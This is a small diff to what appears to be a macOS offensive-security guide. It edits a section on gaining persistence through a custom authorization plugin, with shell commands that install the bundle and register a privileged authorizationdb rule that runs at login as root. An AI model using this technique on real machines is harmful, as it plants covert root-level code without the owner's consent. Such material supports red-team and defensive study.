@@ -1333,7 +1333,7 @@ Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authoriza
 
 #### Description & Exploitation
 
-You can create an authorization plugin that will be executed when a user logs in to maintain persistence. For more information about how to create one of these plugins check the previous writeups (and be careful, a poorly written one can lock you out and you will need to clean your mac from recovery mode).
+You can create an authorization plugin that will be executed when a user logs-in to maintain persistence. For more information about how to create one of these plugins check the previous writeups (and be careful, a poorly written one can lock you out and you will need to clean your mac from recovery mode).
 
 ```objectivec
 // Compile the code and create a real bundle
@@ -1358,8 +1358,6 @@ cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
 
 Finally add the **rule** to load this Plugin:
 
-
-
 ```bash
 cat > /tmp/rule.plist <<EOF
 <?xml version="1.0" encoding="UTF-8"?>
@@ -1378,6 +1376,8 @@ EOF
 
 security authorizationdb write com.asdf.asdf < /tmp/rule.plist
 ```
+
+The **`evaluate-mechanisms`** will tell the authorization framework that it will need to **call an external mechanism for authorization**. Moreover, **`privileged`** will make it be executed by root.
 
 Trigger it with:
 
